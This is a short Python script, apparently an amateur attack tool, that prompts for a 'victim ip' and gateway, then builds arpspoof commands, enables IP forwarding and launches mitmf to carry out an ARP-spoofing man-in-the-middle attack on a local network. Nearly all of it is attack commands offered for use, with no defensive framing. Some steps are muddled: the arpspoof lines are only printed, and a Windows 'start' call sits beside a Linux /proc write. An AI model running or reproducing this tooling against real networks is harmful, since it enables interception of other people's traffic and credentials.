import os
import sys

print ( "hello and welcome to my first shitty software")
print("""\
.______      ___      ________   __  ___   ______   .______      
|   _  \    /   \    |       /  |  |/  /  /  __  \  |   _  \     
|  |_)  |  /  ^  \   `---/  /   |  '  /  |  |  |  | |  |_)  |    
|   ___/  /  /_\  \     /  /    |    <   |  |  |  | |      /     
|  |     /  _____  \   /  /----.|  .  \  |  `--'  | |  |\  \----.
| _|    /__/     \__\ /________||__|\__\  \______/  | _| `._____|
                                                                 
 """)
target = (input("what's the victim ip?"))
gatew = (input("what'S the gateway ip?"))

# want this line to run and open on a new shell (it will run without stopping anyway)
print("arpspoof -i wlan1 -t {0} {1}".format(target,gatew))
os.system("start /B start line.py @cmd /dir")

# want this line to run and open on a new shell (it will run without stopping anyway)
print("arpspoof -i wlan1 -t {0} {1}".format(gatew,target))
idle = (input("press when ready for echo"))
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

idle1 = (input("press when ready for MITMF"))

# want this line to run and open on a new shell (it will run another software)
os.system("mitmf --arp --spoof --gateway {0} --target {1} -i wlan1".format(gatew,target))


close=(input("press anykey to close"))
